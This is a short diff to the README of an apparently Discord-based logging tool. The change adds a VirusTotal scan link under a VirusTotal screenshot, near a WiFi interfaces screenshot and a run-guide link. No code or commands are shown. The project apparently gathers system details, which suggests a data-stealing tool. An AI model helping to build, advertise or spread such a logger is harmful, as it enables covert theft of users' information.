@@ -85,7 +85,8 @@ Wifi interfaces :\
 ![Alt text](img/WifiInterface.png?raw=true)
 \
 VirusTotal :\
-![Alt text](img/VirusTotal.png?raw=true)
+![Alt text](img/VirusTotal.png?raw=true)\
+[Virus Total Link](https://www.virustotal.com/gui/file/b9ad4bfe8c32929e0906023cdc85f0c64765fe25ca55c714bf2d06a8ec130988?nocache=1)
 ## How to Run:
 click [Here](https://github.com/TurtlesXD/Discord-Logger/blob/main/discord-logger-help/Help.md) for the guide
 # 
